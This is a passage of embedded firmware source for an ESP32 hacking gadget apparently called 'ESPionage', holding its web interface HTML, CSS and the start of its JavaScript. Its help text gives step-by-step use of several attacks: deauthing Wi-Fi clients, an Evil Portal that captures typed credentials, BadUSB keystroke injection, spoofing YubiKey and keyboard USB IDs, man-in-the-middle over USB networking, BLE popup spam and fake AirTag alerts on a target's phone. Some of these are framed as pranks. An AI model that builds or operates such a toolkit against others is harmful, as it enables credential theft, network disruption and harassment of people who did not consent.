            <div class="sc-desc">Saves a screenshot of the desktop to a file.</div>
          </button>
          <button class="scene" data-platforms="windows,mac" onclick="loadDucky('speak_text')">
            <div class="sc-ico">&#128266;</div><div class="sc-name">Speak text</div>
            <div class="sc-desc">TTS the machine: creepy remote voice prank.</div>
          </button>
          <button class="scene" data-platforms="windows,mac" onclick="loadDucky('open_many_tabs')">
            <div class="sc-ico">&#127760;</div><div class="sc-name">Tab bomb</div>
            <div class="sc-desc">Opens 10 browser tabs to random URLs.</div>
          </button>
          <button class="scene" data-platforms="windows" onclick="loadDucky('fake_bsod')">
            <div class="sc-ico">&#128151;</div><div class="sc-name">Fake BSOD</div>
            <div class="sc-desc">Triggers a looping fake blue-screen-style prank.</div>
          </button>
          <button class="scene" data-platforms="mac" onclick="loadDucky('flip_screen')">
            <div class="sc-ico">&#128260;</div><div class="sc-name">Invert display</div>
            <div class="sc-desc">Inverts all screen colors instantly. Reversible.</div>
          </button>
        </div>

        <div class="ducky-step">2. Payload <span class="ducky-step-hint">(Ducky syntax; plain lines auto-type as text)</span></div>
        <textarea id="usb-payload" placeholder="STRING hello world&#10;ENTER&#10;GUI r&#10;DELAY 500&#10;STRING notepad&#10;ENTER" oninput="currentDuckyKey=null"></textarea>

        <div class="ducky-step">3. Run</div>
        <div class="row">
          <button class="danger" id="usb-hid-btn" onclick="usbAction('hid')">&#9654; Run payload</button>
          <button class="muted" onclick="usbStop()">Stop</button>
        </div>
        <label><input type="checkbox" id="usb-loop" style="width:auto;margin:0 6px 0 0">Loop continuously</label>
        <div class="status" id="usb-hid-status">&mdash;</div>
      </div>

      <div class="feature" id="usb-mouse-card">
        <div class="feature-head">
          <div><strong>&#128432; HID Mouse jiggler</strong><div class="desc">Independent from BadUSB. Wiggles the mouse so the screen doesn't sleep/lock.</div></div>
          <button class="ibtn" onclick="showInfo('usbmouse')">i</button>
        </div>
        <label>Jiggle interval (seconds)
          <input type="number" id="usb-jiggle-interval" value="30" min="5" max="300">
        </label>
        <div class="row">
          <button class="danger" id="usb-mouse-btn" onclick="toggleJiggler()">&#9654; Start jiggler</button>
        </div>
        <div class="status" id="usb-mouse-status">&mdash;</div>
      </div>

      <div class="feature" id="usb-rndis-card">
        <div class="feature-head">
          <div><strong>&#127760; USB Network (RNDIS)<span class="os-only-badge">Windows only</span></strong><div class="desc">Appear as a USB Ethernet adapter. The target PC routes traffic through you — enables DNS spoofing and MITM on air-gapped machines.</div></div>
          <button class="ibtn" onclick="showInfo('usbrndis')">i</button>
        </div>
        <div class="kv"><span>Spoof IP (device gets)</span><span id="rndis-ip">192.168.7.1</span></div>
        <div class="kv"><span>Target gets</span><span id="rndis-target-ip">192.168.7.2</span></div>
        <div class="row">
          <button class="danger" onclick="usbAction('rndis')">&#9654; Start RNDIS</button>
          <button class="muted" onclick="usbStop()">Stop</button>
        </div>
        <div class="status" id="usb-rndis-status">&mdash;</div>
      </div>

      <div class="feature" id="usb-storage-card">
        <div class="feature-head">
          <div><strong>&#128190; USB Mass Storage</strong><div class="desc">Appear as a 512 KB USB flash drive backed by PSRAM. Target PC sees a drive labelled "ESPIONAGE".</div></div>
          <button class="ibtn" onclick="showInfo('usbstorage')">i</button>
        </div>
        <div class="status" id="usb-storage-status">&mdash;</div>
        <div class="row" style="margin-top:6px">
          <button class="danger" onclick="usbAction('storage')">&#9654; Mount as drive</button>
          <button class="muted" onclick="usbStop()">&#9632; Unmount</button>
        </div>
      </div>

      <div class="feature" id="usb-spoof-card">
        <div class="feature-head">
          <div><strong>&#128268; Device ID spoof</strong><div class="desc">Appear as a specific USB device by VID/PID — YubiKey, trusted keyboard, security dongle, etc.</div></div>
          <button class="ibtn" onclick="showInfo('usbspoof')">i</button>
        </div>
        <div class="scene-grid" style="grid-template-columns:repeat(3,1fr);margin-bottom:10px">
          <button class="scene" onclick="setSpoofId('1050','0407')"><div class="sc-ico">&#128273;</div><div class="sc-name" style="font-size:11px">YubiKey 5</div></button>
          <button class="scene" onclick="setSpoofId('045E','0750')"><div class="sc-ico">&#9000;</div><div class="sc-name" style="font-size:11px">MS Keyboard</div></button>
          <button class="scene" onclick="setSpoofId('046D','C52B')"><div class="sc-ico">&#128433;</div><div class="sc-name" style="font-size:11px">Logitech Rcvr</div></button>
          <button class="scene" onclick="setSpoofId('0781','5583')"><div class="sc-ico">&#128190;</div><div class="sc-name" style="font-size:11px">SanDisk USB</div></button>
          <button class="scene" onclick="setSpoofId('05AC','12A8')"><div class="sc-ico">&#127822;</div><div class="sc-name" style="font-size:11px">iPhone</div></button>
          <button class="scene" onclick="setSpoofId('18D1','4EE2')"><div class="sc-ico">&#129302;</div><div class="sc-name" style="font-size:11px">Android ADB</div></button>
        </div>
        <div class="row">
          <input id="usb-vid" placeholder="VID (hex)" style="flex:1">
          <input id="usb-pid" placeholder="PID (hex)" style="flex:1">
        </div>
        <div class="row">
          <button class="danger" onclick="usbAction('spoof')">&#9654; Apply &amp; reboot USB</button>
          <button class="muted" onclick="usbSpoofReset()">Reset to Apple KB</button>
        </div>
        <p class="ducky-step-hint" style="margin-top:4px">VID/PID takes effect on next USB enumeration — the device will soft-reboot to re-present itself.</p>
        <div class="status" id="usb-spoof-status">&mdash;</div>
      </div>

    </div><!-- /usb-features -->
  </section>

  <!-- SYSTEM -->
  <section id="system" class="tab">
    <h2>System</h2>

    <div class="feature">
      <div class="feature-head"><div><strong>Device</strong></div></div>
      <div class="kv"><span>Chip</span><span id="info-chip">&mdash;</span></div>
      <div class="kv"><span>Cores</span><span id="info-cores">&mdash;</span></div>
      <div class="kv"><span>CPU</span><span id="info-freq">&mdash;</span></div>
      <div class="kv"><span>Flash</span><span id="info-flash">&mdash;</span></div>
      <div class="kv"><span>MAC</span><span id="info-mac">&mdash;</span></div>
      <div class="kv"><span>Firmware</span><span id="info-fw">&mdash;</span></div>
    </div>

    <div class="feature">
      <div class="feature-head">
        <div><strong>Access Point</strong><div class="desc">ESPionage's own WiFi that hosts this UI.</div></div>
        <button class="ibtn" onclick="showInfo('ap')">i</button>
      </div>
      <label>SSID <input id="ap-ssid" placeholder="ESPionage"></label>
      <label>Password <input id="ap-pass" type="text" placeholder="8-63 chars, blank = open"></label>
      <button class="danger block" onclick="saveAp()">Save &amp; reboot</button>
    </div>

    <div class="feature">
      <div class="feature-head">
        <div><strong>Radio</strong><div class="desc">Tune range vs stealth.</div></div>
        <button class="ibtn" onclick="showInfo('radio')">i</button>
      </div>
      <label>TX power <span id="txp-label">20</span> dBm</label>
      <input type="range" id="txp" min="2" max="20" value="20" oninput="document.getElementById('txp-label').textContent=this.value">
      <button class="block muted" onclick="saveTxp()">Apply</button>
      <button class="block muted" onclick="randomizeMac()">Randomize MAC</button>
    </div>

    <div class="feature">
      <div class="feature-head"><div><strong>Danger zone</strong></div></div>
      <button class="block muted" onclick="clearLogs()">Clear all logs</button>
      <button class="block danger" onclick="reboot()">Reboot device</button>
    </div>
  </section>
</main>

<!-- Info modal -->
<div id="infoModal" class="modal"><div class="modal-card">
  <h2 id="info-title"></h2>
  <div id="info-body"></div>
  <button class="block" onclick="closeInfo()">Got it</button>
</div></div>

<!-- GPS start helper -->
<div id="gpsStartModal" class="modal"><div class="modal-card">
  <h2>&#128205; Start GPS</h2>
  <p>Browsers block GPS over plain HTTP, so pick the path that fits your phone:</p>

  <h4>iPhone &mdash; Shortcuts app (recommended)</h4>
  <ol>
    <li>Open <b>Shortcuts</b> app &rarr; <b>+</b> to make a new shortcut.</li>
    <li>Add action: <b>Get Current Location</b>.</li>
    <li>Add action: <b>Get Contents of URL</b>. Tap arrow to expand:
      <ul>
        <li>URL: <code>http://192.168.4.1/api/gps</code></li>
        <li>Method: <b>POST</b></li>
        <li>Headers: <code>Content-Type</code> = <code>application/json</code></li>
        <li>Request Body: <b>JSON</b>
          <ul>
            <li><code>lat</code> = Magic Variable &rarr; <i>Current Location</i> &rarr; Latitude</li>
            <li><code>lon</code> = Magic Variable &rarr; <i>Current Location</i> &rarr; Longitude</li>
            <li><code>acc</code> = Magic Variable &rarr; <i>Current Location</i> &rarr; Horizontal Accuracy</li>
          </ul>
        </li>
      </ul>
    </li>
    <li>Name it &ldquo;Send location to ESPionage&rdquo;. Tap it any time to push your GPS to the device.</li>
    <li>(Optional) <b>Automations</b> tab &rarr; <b>+</b> &rarr; <i>When I connect to Wi&#8209;Fi</i> &rarr; pick <code>ESPionage</code> &rarr; run the shortcut. Or <i>Time of Day</i> every few minutes for continuous tracking.</li>
  </ol>

  <h4>Android Chrome</h4>
  <ol>
    <li>Visit <code>chrome://flags/#unsafely-treat-insecure-origin-as-secure</code></li>
    <li>Add <code>http://192.168.4.1</code>, enable, relaunch Chrome.</li>
    <li>Come back here and tap <b>Use browser GPS</b> below.</li>
  </ol>

  <h4>Just paste coords</h4>
  <p>Grab lat/lon from your Maps app and use the <b>Manual fix</b> box on the home screen.</p>

  <div class="row">
    <button onclick="gpsStart('browser')">Use browser GPS</button>
    <button class="muted" onclick="gpsStart('manual')">Manual only</button>
    <button class="muted" onclick="closeGpsModal()">Cancel</button>
  </div>
</div></div>

<script src="/app.js"></script>
</body>
</html>
)HTML";

static const char STYLE_CSS[] PROGMEM = R"CSS(
* { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
:root {
  --bg: #0b0f14;
  --surface: #131922;
  --surface-2: #1a2230;
  --border: #263040;
  --text: #e8eef5;
  --muted: #7a8599;
  --accent: #3ab0ff;
  --accent-2: #5ccbff;
  --danger: #ff4477;
  --ok: #37d67a;
  --warn: #ffb347;
}
html, body { background: var(--bg); color: var(--text); font-family: -apple-system, BlinkMacSystemFont, "SF Pro", "Segoe UI", system-ui, sans-serif; }
body { display: flex; flex-direction: column; min-height: 100vh; padding-bottom: calc(120px + env(safe-area-inset-bottom, 0px)); overscroll-behavior-y: contain; }
main { padding-bottom: calc(30px + env(safe-area-inset-bottom, 0px)); }

header {
  display: flex; align-items: center; justify-content: space-between;
  padding: 14px 18px; background: var(--surface);
  border-bottom: 1px solid var(--border);
  position: sticky; top: 0; z-index: 10;
}
.title { display: flex; align-items: center; gap: 10px; }
.title h1 { font-size: 18px; font-weight: 600; }
.logo-img { height: 56px; width: auto; }
.title .version { font-size: 11px; color: var(--muted); background: var(--surface-2); padding: 2px 6px; border-radius: 4px; }
.dot { width: 10px; height: 10px; border-radius: 50%; background: var(--danger); transition: background .25s; }
.dot.ok { background: var(--ok); box-shadow: 0 0 8px var(--ok); }
.stats { font-size: 12px; color: var(--muted); display: flex; gap: 10px; font-family: "SF Mono", Menlo, monospace; }

nav {
  display: flex; justify-content: space-around;
  background: var(--surface);
  border-top: 1px solid var(--border);
  padding: 6px 4px calc(6px + env(safe-area-inset-bottom, 0px));
  position: fixed; bottom: 0; left: 0; right: 0;
  z-index: 10;
}
nav button {
  background: none; border: none; color: var(--muted);
  padding: 8px 6px; cursor: pointer; border-radius: 10px;
  transition: all .15s; flex: 1; max-width: 90px;
}
nav button .ico { font-size: 22px; }
nav button .lbl { font-size: 10px; margin-top: 2px; letter-spacing: 0.5px; }
nav button.active { background: var(--surface-2); color: var(--accent); }

main { flex: 1; padding: 18px; max-width: 800px; margin: 0 auto; width: 100%; }
.tab { display: none; animation: fade .2s; }
.tab.active { display: block; }
@keyframes fade { from { opacity: 0; transform: translateY(4px); } to { opacity: 1; transform: none; } }

h2 { font-size: 22px; margin-bottom: 16px; font-weight: 600; }
h3 {
  font-size: 12px; margin: 18px 0 10px; color: var(--muted);
  text-transform: uppercase; letter-spacing: 1.5px;
  display: flex; align-items: center; gap: 8px;
}
h3 .ghost { margin-left: auto; }
.ghost { background: none; border: 1px solid var(--border); color: var(--muted); cursor: pointer; font-size: 13px; border-radius: 8px; padding: 4px 10px; }
p.desc { color: var(--muted); font-size: 13px; line-height: 1.5; margin-bottom: 12px; }
p.desc.warn { color: var(--warn); }

button, .button-link {
  background: var(--accent); color: #001020; border: none;
  padding: 10px 16px; border-radius: 10px; font-weight: 600;
  font-size: 14px; cursor: pointer; transition: transform .05s, opacity .1s;
  display: inline-block; text-decoration: none; text-align: center;
}
button:active, .button-link:active { transform: scale(0.96); opacity: 0.75; filter: brightness(1.3); }
button.muted:active { background: var(--border); color: var(--accent); }
button.danger:active { filter: brightness(1.4); }
button.danger { background: var(--danger); color: white; }
button.muted, .button-link.muted { background: var(--surface-2); color: var(--text); transition: background .1s, color .1s, transform .05s; }
button.block { width: 100%; margin-top: 8px; }
button.pressed { background: var(--ok) !important; color: #001020 !important; }

.row { display: flex; gap: 8px; margin-bottom: 10px; flex-wrap: wrap; align-items: center; }
.row button, .row .button-link { flex: 1; min-width: 90px; }
.row select { flex: 2; min-width: 160px; }

.cards { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin: 14px 0 18px; }
.card { background: var(--surface); border: 1px solid var(--border); border-radius: 12px; padding: 14px; }
.card.stat { text-align: center; }
.card .v { font-size: 20px; font-weight: 600; color: var(--accent); font-family: "SF Mono", Menlo, monospace; }
.card .l { font-size: 10px; color: var(--muted); text-transform: uppercase; letter-spacing: 1px; margin-top: 4px; }

.grid2 { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; margin-bottom: 10px; }
.grid2 button { padding: 18px 12px; line-height: 1.4; }
.grid2 button small { font-size: 11px; opacity: 0.85; font-weight: 400; }

/* Scenes */
.scene-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; margin-bottom: 10px; }
.scene {
  background: var(--surface); border: 1px solid var(--border);
  border-radius: 12px; padding: 14px 12px; text-align: left;
  display: flex; flex-direction: column; gap: 4px;
  font-size: 14px; color: var(--text); cursor: pointer;
  transition: all .15s;
}
.scene:hover { border-color: var(--accent); transform: translateY(-1px); }
.scene.active { border-color: var(--accent); background: rgba(58,176,255,.08); box-shadow: 0 0 0 2px rgba(58,176,255,.25); }
.scene.danger:hover { border-color: var(--danger); }
.scene.danger.active { border-color: var(--danger); background: rgba(255,68,119,.1); box-shadow: 0 0 0 2px rgba(255,68,119,.25); }
.scene .sc-ico { font-size: 26px; }
.scene .sc-name { font-weight: 600; font-size: 15px; }
.scene .sc-desc { font-size: 11px; color: var(--muted); line-height: 1.35; font-weight: 400; }
.scene-active {
  display: flex; align-items: center; gap: 10px;
  background: var(--surface-2); border: 1px solid var(--accent);
  border-radius: 10px; padding: 10px 12px; margin-bottom: 12px;
  font-size: 13px;
}
/* Apple Juice picker */
.aj-cats { display: flex; gap: 6px; margin-bottom: 10px; flex-wrap: wrap; }
.aj-cat {
  flex: 1; padding: 6px 10px; font-size: 12px; font-weight: 600;
  background: var(--surface); border: 1px solid var(--border);
  border-radius: 8px; color: var(--muted); cursor: pointer; transition: all .15s;
}
.aj-cat.active { border-color: var(--accent); color: var(--accent); background: rgba(58,176,255,.08); }
.aj-grid {
  display: grid; grid-template-columns: repeat(2,1fr); gap: 6px;
  max-height: 240px; overflow-y: auto; margin-bottom: 8px;
}
.aj-btn {
  padding: 8px 10px; font-size: 12px; font-weight: 500;
  background: var(--surface); border: 1px solid var(--border);
  border-radius: 8px; color: var(--text); cursor: pointer;
  text-align: left; transition: all .15s;
}
.aj-btn:hover { border-color: #f87171; color: #f87171; }
.aj-btn.active { border-color: #f87171; background: rgba(248,113,113,.12); color: #f87171; }
.scene-active .sa-label { color: var(--muted); }
.scene-active #sa-name { font-weight: 600; flex: 1; color: var(--accent); }
.scene-active button { padding: 6px 12px; font-size: 12px; }

/* GPS */
.filter { display: flex; align-items: center; gap: 8px; font-size: 12px; color: var(--muted); margin: 4px 0 8px; cursor: pointer; }
.filter input { width: auto; margin: 0; }
.probe-item { flex-direction: column; align-items: flex-start; }
.probe-header { display: flex; justify-content: space-between; width: 100%; align-items: center; margin-bottom: 6px; }
.probe-networks { display: flex; flex-wrap: wrap; gap: 5px; margin-bottom: 4px; }
.ssid-tag { background: rgba(58,176,255,.15); color: var(--accent); border: 1px solid rgba(58,176,255,.3); border-radius: 6px; padding: 2px 8px; font-size: 11px; font-weight: 500; }
.ssid-tag.muted { background: var(--surface-2); color: var(--muted); border-color: var(--border); }
.gps-panel { background: var(--surface); border: 1px solid var(--border); border-radius: 10px; padding: 12px 14px; margin-bottom: 12px; }
.gps-panel.live { border-color: var(--ok); }
.btn-link { display: inline-flex; align-items: center; justify-content: center; background: var(--surface-2); color: var(--accent); padding: 8px 14px; border-radius: 8px; text-decoration: none; font-size: 13px; font-weight: 500; }

/* USB */
.usb-status-banner {
  display: flex; align-items: center; gap: 14px;
  padding: 14px 16px; border-radius: 12px; margin-bottom: 14px;
  background: var(--surface); border: 1px solid var(--border);
  font-size: 14px; font-weight: 500;
}
.usb-status-banner #usb-chip-icon { font-size: 28px; flex-shrink: 0; }
.usb-status-banner.ok { border-color: var(--ok); background: rgba(0,200,100,.07); }
.usb-status-banner.warn { border-color: var(--warn); background: rgba(255,165,0,.07); }
.usb-status-banner.err { border-color: var(--danger); background: rgba(255,68,119,.07); }
.usb-locked { opacity: 0.4; pointer-events: none; user-select: none; }
/* OS toggle */
.os-toggle { display: flex; align-items: center; gap: 8px; margin-bottom: 14px; flex-wrap: wrap; }
.os-label { font-size: 12px; color: var(--muted); }
.os-btn { padding: 6px 14px; border-radius: 20px; border: 1px solid var(--border); background: var(--surface); color: var(--text); font-size: 13px; cursor: pointer; transition: all .15s; }
.os-btn.active { background: var(--accent); border-color: var(--accent); color: #fff; font-weight: 600; }
.os-only-badge { font-size: 10px; font-weight: 600; padding: 2px 7px; border-radius: 10px; background: rgba(255,165,0,.15); color: var(--warn); margin-left: 6px; vertical-align: middle; }
.ducky-step { font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: .8px; color: var(--accent); margin: 12px 0 6px; border-top: 1px dashed var(--border); padding-top: 10px; }
.ducky-step:first-of-type { border-top: 0; padding-top: 0; margin-top: 4px; }
.ducky-step-hint { font-size: 11px; font-weight: 400; text-transform: none; letter-spacing: 0; color: var(--muted); margin-left: 6px; }


.mode-banner {
  padding: 12px 14px; background: var(--surface-2);
  border-left: 3px solid var(--accent); border-radius: 8px;
  margin-bottom: 14px; font-size: 15px; font-weight: 500;
}
.mode-banner.active { border-color: var(--danger); background: rgba(255, 68, 119, 0.1); animation: pulse 1.8s infinite; }
@keyframes pulse { 0%,100% { box-shadow: 0 0 0 0 rgba(255,68,119,.4); } 50% { box-shadow: 0 0 0 6px rgba(255,68,119,0); } }

.feature {
  background: var(--surface); border: 1px solid var(--border);
  border-radius: 12px; padding: 14px; margin-bottom: 12px;
}
.feature-head {
  display: flex; justify-content: space-between; align-items: flex-start;
  gap: 12px; margin-bottom: 10px;
}
.feature-head strong { font-size: 15px; font-weight: 600; }
.feature-head .desc { font-size: 12px; color: var(--muted); margin-top: 2px; }

.ibtn {
  background: var(--surface-2); color: var(--accent);
  width: 24px; height: 24px; padding: 0;
  border-radius: 50%; font-size: 12px; font-weight: 700;
  font-style: italic; flex-shrink: 0;
  display: inline-flex; align-items: center; justify-content: center;
}

.status {
  font-size: 12px; color: var(--muted); padding: 6px 0;
  font-family: "SF Mono", Menlo, monospace;
}

.list { display: flex; flex-direction: column; gap: 6px; max-height: 45vh; overflow-y: auto; }
.list-item {
  background: var(--surface-2); border: 1px solid var(--border);
  padding: 10px 12px; border-radius: 8px;
  display: flex; justify-content: space-between; align-items: center;
  font-size: 13px;
}
.list-item .l { display: flex; flex-direction: column; gap: 2px; min-width: 0; }
.list-item .l .name { font-weight: 500; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
.list-item .l .meta { font-size: 11px; color: var(--muted); font-family: "SF Mono", Menlo, monospace; }
.list-item .r { font-size: 12px; color: var(--muted); font-family: "SF Mono", Menlo, monospace; white-space: nowrap; margin-left: 8px; }
.list-item .r.strong { color: var(--ok); }
.list-item .r.weak { color: var(--muted); }

.activity .list-item { background: none; border: none; border-left: 2px solid var(--border); border-radius: 0; padding: 6px 10px; }
.activity .list-item.capture { border-left-color: var(--danger); }
.activity .list-item.alert   { border-left-color: var(--warn); }
.activity .list-item.spam    { border-left-color: var(--danger); }
.activity .list-item.scan    { border-left-color: var(--accent); }

textarea, input, select {
  width: 100%; background: var(--surface-2); color: var(--text);
  border: 1px solid var(--border); border-radius: 8px;
  padding: 10px; font: inherit; font-size: 14px;
  margin-bottom: 10px;
}
textarea { min-height: 80px; resize: vertical; font-family: "SF Mono", Menlo, monospace; }
label { display: block; font-size: 12px; color: var(--muted); margin-bottom: 6px; }
label input { margin-top: 4px; }

.kv {
  display: flex; justify-content: space-between;
  padding: 8px 0; border-bottom: 1px solid var(--border);
  font-size: 13px;
}
.kv:last-child { border-bottom: none; }
.kv span:first-child { color: var(--muted); }
.kv span:last-child { font-family: "SF Mono", Menlo, monospace; }

/* Finder */
.finder-panel { background: var(--surface-2); border-radius: 10px; padding: 16px; margin-top: 10px; text-align: center; }
.finder-distance { font-size: 64px; font-weight: 200; color: var(--accent); font-family: "SF Mono", Menlo, monospace; line-height: 1; }
.finder-distance .unit { font-size: 22px; color: var(--muted); margin-left: 6px; }
.finder-rssi { font-size: 12px; color: var(--muted); margin: 6px 0 12px; font-family: "SF Mono", Menlo, monospace; }
.finder-bar { height: 8px; background: var(--border); border-radius: 4px; overflow: hidden; margin: 10px 0; }
.finder-bar .fill { height: 100%; background: linear-gradient(90deg, var(--danger), var(--warn), var(--ok)); width: 0; transition: width .3s; }
.finder-trend { font-size: 14px; font-weight: 600; letter-spacing: 1px; margin-top: 8px; color: var(--muted); }
.finder-trend.warm { color: var(--warn); }
.finder-trend.hot { color: var(--danger); }
.finder-trend.cold { color: var(--accent-2); }

/* Portal grid */
.portal-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin-bottom: 10px; }
.portal-pick {
  background: var(--surface-2); border: 1px solid var(--border);
  border-radius: 10px; padding: 14px 6px; text-align: center;
  font-size: 11px; cursor: pointer; transition: all .1s;
}
.portal-pick:hover { border-color: var(--accent); }
.portal-pick.active { border-color: var(--accent); background: rgba(58,176,255,.1); }
.portal-pick .pt-ico { font-size: 28px; margin-bottom: 4px; }

/* Modal */
.modal {
  position: fixed; inset: 0; background: rgba(0,0,0,0.7);
  display: none; align-items: center; justify-content: center;
  z-index: 100; padding: 20px;
}
.modal.open { display: flex; }
.modal-card {
  background: var(--surface); border: 1px solid var(--border);
  border-radius: 16px; padding: 24px; max-width: 440px; width: 100%;
  max-height: 80vh; overflow-y: auto;
}
.modal-card h2 { font-size: 20px; margin-bottom: 12px; }
.modal-card h4 { font-size: 11px; color: var(--muted); text-transform: uppercase; letter-spacing: 1px; margin: 16px 0 6px; }
.modal-card p { font-size: 14px; line-height: 1.5; margin-bottom: 10px; }
.modal-card ol, .modal-card ul { font-size: 14px; line-height: 1.6; padding-left: 20px; margin-bottom: 10px; }
.modal-card .note { background: var(--surface-2); border-left: 3px solid var(--warn); padding: 10px 12px; font-size: 13px; color: var(--warn); border-radius: 4px; margin: 12px 0; }
)CSS";

static const char APP_JS[] PROGMEM = R"JS(
let ws = null;
const modeNames = {
  0: "Idle", 1: "WiFi Scan", 2: "BLE Scan",
  3: "Beacon Spam", 4: "Apple Spam", 5: "Google Spam",
  6: "Samsung Spam", 7: "Microsoft Spam",
  8: "Probe Sniff", 9: "Evil Portal",
  10: "Wardrive", 11: "AirTag Detect",
  12: "WiFi Finder", 13: "BLE Finder",
  14: "Mix Spam", 15: "Custom BLE Adv",
  16: "Rogue AP", 17: "Deauth", 18: "SSID Message"
};

// -------- Info popup content --------
const INFO = {
  scenes: {
    t: "Scenes",
    b: "One-tap combos of multiple features. Useful for quick demos, pranks, or panic-mode attacks without switching tabs."
  },
  activity: {
    t: "Activity log",
    b: "Rolling log of everything ESPionage does: scans, captures, alerts, attacks. Newest on top. Saved in RAM only (cleared on reboot)."
  },
  wifiscan: {
    t: "WiFi scan",
    b: "Lists every WiFi access point the ESP32 can hear. Completely passive \u2014 no frames sent.",
    fields: { "Shows": "Name, BSSID, channel, signal (RSSI), encryption" }
  },
  wififinder: {
    t: "WiFi Finder (RSSI \u2192 meters)",
    b: "Locks onto a target AP and estimates distance using the log-distance path loss formula. Walk around and the number shrinks as you get closer.",
    how: ["Scan first (top of tab)","Pick target from dropdown","Hit Lock","Stand 1m from router, tap Calibrate","Walk \u2014 watch distance change"],
    note: "Accuracy is \u00b12\u201310 m indoors. Walls and bodies distort signal."
  },
  probesniff: {
    t: "Probe sniffer",
    b: "Phones continuously ask \"is my home network around?\" \u2014 these are probe requests. Sniffing them reveals what networks every nearby phone has connected to before. Very revealing about owner habits.",
    note: "Hops through channels 1\u201311 every 500 ms to catch probes on all channels."
  },
  wardrive: {
    t: "Wardriving",
    b: "Continuously logs every AP seen. Download the CSV and upload to WiGLE.net to contribute to the global WiFi map. Good for walks/drives.",
    note: "No GPS on ESPionage, so entries have no coordinates. You'd need to add them manually or run this alongside a GPS logger."
  },
  deauth: {
    t: "Deauth attack",
    b: "Sends forged \"disconnect\" (802.11 deauth) frames with the target's BSSID as source. Clients believe the AP is kicking them off.",
    how: ["Scan first","Pick target AP","Hit Attack","All clients on that AP get booted","Continues until you Stop"],
    note: "Most modern WiFi (WPA3, Protected Management Frames) is immune. But a lot of home/office gear still accepts unauthenticated deauth. Illegal to use on networks you don't own."
  },
  rogueap: {
    t: "Rogue AP",
    b: "Puts up an open WiFi network with whatever name you type. Doesn't forward internet \u2014 just exists to be seen.",
    note: "Combined with the Evil Portal, forms a Karma-lite attack: phones may auto-connect to \"Free WiFi\" and then see the login page."
  },
  blescan: {
    t: "BLE scan",
    b: "Lists every Bluetooth LE device advertising nearby. Phones, earbuds, watches, tags, smart devices. Passive."
  },
  blefinder: {
    t: "BLE Finder",
    b: "Same idea as WiFi Finder, but for BLE devices. Useful for finding lost earbuds, trackers, or figuring out which direction a BLE device is from you.",
    note: "BLE 1m reference is around -59 dBm (vs WiFi -45). Calibrate by standing 1m away and tapping Calibrate."
  },
  airtag: {
    t: "AirTag / Find My detector",
    b: "Apple AirTags and other Find My devices broadcast a specific BLE pattern. This watches for them, tracks unique MACs, and alerts when any single device has been near you for 3+ minutes.",
    note: "Helps detect stalker-tag scenarios. Apple's own 'Tracker Detect' and Android's built-in unknown tracker alerts do similar."
  },
  customadv: {
    t: "Custom BLE advertiser",
    b: "Makes the ESP32 appear in Bluetooth device lists with whatever name you type. Harmless fun \u2014 great for messing with friends."
  },
  airtagemu: {
    t: "AirTag emulator",
    b: "Broadcasts Apple FindMy advertisements (type 0x12) using a random ephemeral key. Nearby iPhones with iOS 14.5+ will detect it and after ~10 min show an \"AirTag Found Moving With You\" alert — the same as a real separated AirTag.",
    how: ["Tap Start","Leave it running near the target for ~10 minutes","iOS plays a sound and shows the AirTag alert","The advertisement changes MAC and counter every cycle to mimic a rotating key"],
    note: "Requires the target's phone to have BT and FindMy/personal safety features enabled. Newer iOS may require 3 days before the alert fires for unknown tags."
  },
  applejuice: {
    t: "Apple Juice",
    b: "Spams a specific Apple device pairing advertisement at every nearby iPhone/iPad. Inspired by the AppleJuice project \u2014 31 devices across AirPods, Beats, Nearby Action sheets, and Apple TV setup popups.",
    how: ["Pick a category (AirPods, Nearby Action, Apple TV)","Tap a device to start spamming that exact popup","Each packet uses a fresh randomised MAC so the popup appears repeatedly","Tap Stop when done"],
    note: "Works best on iOS with Bluetooth on and screen unlocked. iOS 17.1+ is more resistant to proximity pairing popups but Nearby Action sheets still fire."
  },
  blespam: {
    t: "BLE pairing popups (Google / Samsung / Windows)",
    b: "Broadcasts fake manufacturer-specific BLE advertisements that match real products. Phones pick them up and show pairing popups (\"Pixel Buds nearby\", Galaxy Buds, Swift Pair, etc).",
    how: ["Pick vendor","ESPionage rotates random MAC + random product payload","Each vendor targets a different phone OS","Phones show popup every few seconds"],
    note: "For Apple devices use Apple Juice above — it has 31 targeted Apple payloads."
  },
  beacon: {
    t: "Beacon spam (WiFi)",
    b: "Injects raw 802.11 beacon frames with SSIDs you choose. Your neighbors' phones see dozens of new networks appear.",
    note: "Leave SSIDs blank for a built-in meme list (Rickroll, FBI Van, etc)."
  },
  ssidmsg: {
    t: "SSID message",
    b: "Splits a sentence into words and broadcasts each as a numbered SSID: \"[1] HELLO\", \"[2] FROM\", \"[3] ESPIONAGE\" \u2014 readable in the WiFi list of nearby phones."
  },
  portal: {
    t: "Evil Portal",
    b: "When active, any device that connects to ESPionage AP and tries to browse gets redirected to a fake login page. Credentials they type are captured to RAM.",
    how: ["Pick template","Start Portal","Victim connects to your AP","Any URL redirects to /portal-login","They type creds \u2192 captured here"],
    note: "Only use on networks you own or have explicit permission to test. Capturing real credentials without consent is illegal."
  },
  creds: {
    t: "Captured credentials",
    b: "Everything submitted to the fake login page. Stored in RAM only (up to 32 entries, oldest dropped). Wiped on reboot or 'Clear all logs'."
  },
  ap: {
    t: "Access Point",
    b: "The ESPionage's own WiFi that serves this UI. Change it to something less obvious, set a stronger password, or leave the password blank for an open AP (not recommended).",
    note: "Changing SSID/password reboots the device. You'll need to reconnect on the new network."
  },
  usbhid: {
    t: "BadUSB / HID Keyboard",
    b: "When plugged into a target PC the ESP32 appears as a USB keyboard. The payload script types keystrokes automatically at machine speed — invisible to the user, no software install needed.",
    how: ["Plug into target USB port","Wait for driver install (1-3s)","Hit Run — keystrokes fire instantly","Target sees a keyboard, not a storage device"],
    note: "Requires ESP32-S2 or S3 with native USB. Won't work on standard ESP32 DevKit (uses USB-UART chip for flashing only). Illegal to use on systems you don't own."
  },
  usbmouse: {
    t: "HID Mouse jiggler",
    b: "Moves the mouse a tiny random amount on a timer. Prevents the screen from locking during long sessions — useful for keeping a compromised workstation awake.",
    note: "Requires ESP32-S2/S3."
  },
  usbducky: {
    t: "Rubber Ducky scripts",
